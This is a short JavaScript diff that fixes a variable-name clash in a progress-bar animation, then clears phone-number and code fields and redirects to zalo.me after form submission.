@@ -1,9 +1,9 @@
+var loadingLine = document.querySelector('.loading');
 function progress(){
   var percent = document.querySelector('.percent');
   var progress = document.querySelector('.progress');
   var text = document.querySelector('.text');
-  var loading = document.querySelector('.loading');
-  loading.style.display = 'inline-block'
+  loadingLine.style.display = 'inline-block'
   var count = 4;
   var per = 4;
   var loading = setInterval(animate, 25);
@@ -12,7 +12,7 @@ function progress(){
       percent.classList.add("text-blink");
       text.style.display = "inline-block";
       clearInterval(loading);
-      loading.style.display = 'none'
+      loadingLine.style.display = 'none'
     }else{
       per = per + 1;
       count = count + 1;
@@ -42,12 +42,12 @@ function myFunction() {
     }
       showError.innerHTML = "";
       progress();
+      loadingLine.style.display = 'inline-block'
       setTimeout(function () {
         phoneNumber.value =""
         code.value =""
         window.location.href = "https://zalo.me";
       }, 2500);
   }
-  //window.location.href = "fb://page/300881516665819/reviews";
 }
 
